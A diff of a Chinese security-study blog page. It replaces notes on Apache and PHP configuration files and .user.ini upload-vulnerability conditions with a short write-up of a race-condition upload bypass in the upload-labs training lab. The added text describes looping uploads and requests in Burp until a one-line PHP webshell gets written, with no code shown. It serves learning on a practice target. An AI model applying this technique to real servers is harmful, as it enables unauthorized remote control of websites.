-<h1 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd-conf"></a>httpd-conf</h1><blockquote>
-<p>作用:°包含 Apache·HTTP.服务器的全局行为和默认设置<br>作用范围:整个服务器<br>优先级:<strong>较低</strong><br>生效方式:管理员权限，重启服务器后生效</p>
+<blockquote>
+<p>文件竞争，是因为这个文件要到服务器去处理，到服务器处理的话那么服务器就会有判断时间（if时长），那我们不断地上传，只要有一时刻生成小马文件上传成功，那么我们就有了一句话木马得到权限</p>
 </blockquote>
-<h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><blockquote>
-<p>作用:特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。<br>它用于覆盖或追加全局配置文件(如·php.ini)中的·PHP.配置选项。<br>作用范围:存放该文件的目录以及其子目录<br>优先级:<strong>较高</strong>，可以覆盖 php.ini<br>生效方式:立即生效</p>
+<p><img src="/.com//image-20250123214234-jpnq0tp.png" alt="image"> </p>
+<blockquote>
+<p>我们只需要不断地上传这个小马文件，然后让系统有一瞬间处理勒这个小马文件</p>
 </blockquote>
-<h1 id="php-ini"><a href="#php-ini" class="headerlink" title=".php.ini"></a>.php.ini</h1><blockquote>
-<p>作用:存储了对整个·PHP.环境生效的配置选项。它通常位于·PHP.安装目录中<br>作用范围:所有运行在该·PHP·环境中的·PHP·请求<br>优先级:·较低<br>生效方式:重启 php 或 web 服务器</p>
-</blockquote>
+<p>即我上传的111.php生成小马文件，那么我访问&#x2F;upload&#x2F;111.php</p>
+<p>上传和访问都在burp上面循环访问，知道生成shell.php成功，访问shell.php</p>
 <p>‍</p>
-<p>加载方式:会首先加载·php.ini&#x2F;httpd-conf 文件中的配置。然而，如果在某个目录下存在·.userini&#x2F;.htaccess:文件,服务器会在处理请求时检查该目录,并覆盖相应的配置项。</p>
-<p>‍</p>
-<h1 id="user-ini可以生效的前提"><a href="#user-ini可以生效的前提" class="headerlink" title=".user.ini可以生效的前提:"></a>.user.ini可以生效的前提:</h1><p>最好大于 5.3.0，最好是用 7.X 版本的<br>Server·AP!.为 CGl&#x2F;FastCG——Phpinfo()查看Server·API<br>(Server·API(Application·Programming·Interface，应用程序编程接<br>口)是一组定义了软件组件之间交互方式的规范。在这种情况下<br>Server·API·是指用于连接和交互的服务器端软件接口。)<br>user.ini 文件上传漏洞的前提:<br>.user.ini 可以生效并且该上传目录有 php 文件</p>
-<p>‍</p>
-<h1 id="user-ini文件上传漏洞的前提："><a href="#user-ini文件上传漏洞的前提：" class="headerlink" title=".user.ini文件上传漏洞的前提："></a>.user.ini文件上传漏洞的前提：</h1><p>.user.ini可以生效并且该上传目录<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">有php文件</span></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" data-id="cmawcfx9o0036cg7kg1h4gxfl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入靶场"><a href="#sql注入靶场" class="headerlink" title="sql注入靶场"></a>sql注入靶场</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">sql末尾</a>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">sql-labs搭建</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" data-id="cmawcfx9p003acg7kg74v3nvp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" data-id="cmawck7ij003brk7k43zq6rdl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
